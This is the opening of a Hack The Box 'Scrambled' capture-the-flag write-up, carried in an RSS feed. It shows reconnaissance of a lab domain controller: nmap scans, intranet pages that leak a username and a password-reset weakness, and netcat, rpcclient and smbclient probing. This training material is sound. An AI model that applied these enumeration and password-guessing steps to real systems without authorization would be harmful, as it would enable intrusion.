<?xml version="1.0" encoding="UTF-8"?>
<rss  xmlns:atom="http://www.w3.org/2005/Atom" 
      xmlns:media="http://search.yahoo.com/mrss/" 
      xmlns:content="http://purl.org/rss/1.0/modules/content/" 
      xmlns:dc="http://purl.org/dc/elements/1.1/" 
      version="2.0">
<channel>
<title>Exploit.se</title>
<link>https://exploit.se/writeups.html</link>
<atom:link href="https://exploit.se/writeups.xml" rel="self" type="application/rss+xml"/>
<description>Writeups and articles about cyber security / hacking.</description>
<generator>quarto-1.7.32</generator>
<lastBuildDate>Fri, 16 Sep 2022 00:00:00 GMT</lastBuildDate>
<item>
  <title>Scrambled - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/2022-09-16-htb-writeup-scrambled.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1---basic-enumeration" class="level3">
<h3 class="anchored" data-anchor-id="step-1---basic-enumeration">Step 1 - Basic enumeration</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.168</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>    open  http</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ldapssl</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1433/tcp</span>  open  ms-sql-s</span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4411/tcp</span>  open  found</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  wsman</span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  adws</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  unknown</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49673/tcp</span> open  unknown</span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49674/tcp</span> open  unknown</span>
<span id="cb1-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49700/tcp</span> open  unknown</span>
<span id="cb1-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49704/tcp</span> open  unknown</span>
<span id="cb1-24"></span>
<span id="cb1-25"></span>
<span id="cb1-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49700,49704</span> 10.10.11.168</span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE       VERSION</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>    open  http          Microsoft IIS httpd 10.0</span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Scramble Corp Intranet</span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-methods:</span> </span>
<span id="cb1-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server</span> time: 2022-09-15 07:32:05Z<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> scrm.local0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-09-15T07:35:12+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0s</span> from scanner time.</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=DC1.scrm.local</span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: othername:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>unsupported<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, DNS:DC1.scrm.local</span>
<span id="cb1-41"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-09T15:30:57</span>
<span id="cb1-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2023-06-09T15:30:57</span>
<span id="cb1-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> scrm.local0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-47"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=DC1.scrm.local</span>
<span id="cb1-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: othername:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>unsupported<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, DNS:DC1.scrm.local</span>
<span id="cb1-49"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-09T15:30:57</span>
<span id="cb1-50"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2023-06-09T15:30:57</span>
<span id="cb1-51"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-09-15T07:35:12+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0s</span> from scanner time.</span>
<span id="cb1-52"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1433/tcp</span>  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RTM</span></span>
<span id="cb1-53"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=SSL_Self_Signed_Fallback</span>
<span id="cb1-54"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-09-15T07:27:07</span>
<span id="cb1-55"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2052-09-15T07:27:07</span>
<span id="cb1-56"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-09-15T07:35:12+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0s</span> from scanner time.</span>
<span id="cb1-57"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> scrm.local0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-58"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=DC1.scrm.local</span>
<span id="cb1-59"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: othername:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>unsupported<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, DNS:DC1.scrm.local</span>
<span id="cb1-60"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-09T15:30:57</span>
<span id="cb1-61"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2023-06-09T15:30:57</span>
<span id="cb1-62"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-09-15T07:35:12+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0s</span> from scanner time.</span>
<span id="cb1-63"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> scrm.local0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-64"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=DC1.scrm.local</span>
<span id="cb1-65"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: othername:<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>unsupported<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, DNS:DC1.scrm.local</span>
<span id="cb1-66"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-09T15:30:57</span>
<span id="cb1-67"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2023-06-09T15:30:57</span>
<span id="cb1-68"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-09-15T07:35:12+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0s</span> from scanner time.</span>
<span id="cb1-69"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4411/tcp</span>  open  found<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-70"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fingerprint-strings:</span> </span>
<span id="cb1-71"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DNSStatusRequestTCP,</span> DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span>
<span id="cb1-72"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SCRAMBLECORP_ORDERS_V1.0.3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb1-73"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">FourOhFourRequest,</span> GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: </span>
<span id="cb1-74"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SCRAMBLECORP_ORDERS_V1.0.3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb1-75"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    ERROR_UNKNOWN_COMMAND<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb1-76"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  http          Microsoft HTTPAPI httpd 2.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SSDP/UPnP</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-77"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-78"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Not Found</span>
<span id="cb1-79"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-80"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-81"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49673/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-82"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49674/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-83"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49700/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-84"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49704/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-85"></span>
<span id="cb1-86"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> script results:</span>
<span id="cb1-87"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb2-security-mode:</span> </span>
<span id="cb1-88"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3.1.1:</span> </span>
<span id="cb1-89"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    Message signing enabled and required</span>
<span id="cb1-90"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb2-time:</span> </span>
<span id="cb1-91"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">date:</span> 2022-09-15T07:34:34</span>
<span id="cb1-92"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  start_date: N/A</span>
<span id="cb1-93"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ms-sql-info:</span> </span>
<span id="cb1-94"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.168:1433:</span> </span>
<span id="cb1-95"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Version:</span> </span>
<span id="cb1-96"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name:</span> Microsoft SQL Server 2019 RTM</span>
<span id="cb1-97"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">number:</span> 15.00.2000.00</span>
<span id="cb1-98"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Product:</span> Microsoft SQL Server 2019</span>
<span id="cb1-99"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> pack level: RTM</span>
<span id="cb1-100"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>       <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Post-SP</span> patches applied: false</span>
<span id="cb1-101"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    TCP port: 1433</span></code></pre></div>
<p><strong>port 80:</strong> <img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled01.png" class="img-fluid"></p>
<p>Under the tab <em>IT Services</em> we find this message: &gt; <em>“04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues”</em></p>
<p><code>/supportrequest.html</code> gives us few more details:</p>
<ul>
<li><p>Dial extension <strong>0866</strong> to reach support, might be useful if there are any VoIP elements</p></li>
<li><p>Support email is <code>support@scramblecorp.com</code> add domain to <code>/etc/hosts</code></p></li>
<li><p>We also find the user <code>ksimpson</code> from the cmd image:</p></li>
</ul>
<p><img src="https://exploit.se/posts/2022-09-16-htb-writeup-scrambled/images/scrambled02.png" class="img-fluid"></p>
<p>We can request a user account for new employees at <code>/newuser.html</code>, this might be a possible vector for XSS/CSRF/SSRF attacks.</p>
<p><code>/salesorders.html</code> shows us how to enable debugging for the sales order app. Possible that we can extract sensitive information from the app.</p>
<p><code>/passwords.html</code> gives us a huge piece of information, passwords might be set to be the same as username:</p>
<blockquote class="blockquote">
<p><em>“Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your <strong>password to be the same as the username.</strong>”</em></p>
</blockquote>
<p><strong>port 4411:</strong> This port stands out and isn’t anything standard. We’re able to connect to it unauthenticated but we don’t know any commands available.</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nc 10.10.11.168 4411</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SCRAMBLECORP_ORDERS_V1.0.3</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-3"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">help</span></span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_UNKNOWN_COMMAND</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HELP</span></span>
<span id="cb2-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_UNKNOWN_COMMAND</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">h</span></span>
<span id="cb2-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_UNKNOWN_COMMAND</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb2-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_UNKNOWN_COMMAND</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">list</span></span>
<span id="cb2-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_UNKNOWN_COMMAND</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">show</span></span>
<span id="cb2-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ERROR_UNKNOWN_COMMAND</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb2-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">dir</span></span></code></pre></div>
<p>Lets move on and keep this port in mind for a later stage.</p>
<p><strong>port 139/445:</strong></p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled rpcclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-U</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span> 10.10.11.168</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\'</span>s password: </span>
<span id="cb3-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cannot</span> connect to server.  Error was NT_STATUS_NOT_SUPPORTED</span>
<span id="cb3-4"></span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled rpcclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-U</span> ksimpson 10.10.11.168</span>
<span id="cb3-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\k</span>simpsons password: </span>
<span id="cb3-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Cannot</span> connect to server.  Error was NT_STATUS_NOT_SUPPORTED</span>
<span id="cb3-8"></span>
<span id="cb3-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nbtscan <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> 10.10.11.168</span>
<span id="cb3-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Doing</span> NBT name scan for addresses from 10.10.11.168</span>
<span id="cb3-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">IP</span> address       NetBIOS Name     Server    User             MAC address      </span>
<span id="cb3-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">------------------------------------------------------------------------------</span></span>
<span id="cb3-13"></span>
<span id="cb3-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled smbclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 10.10.11.168</span>
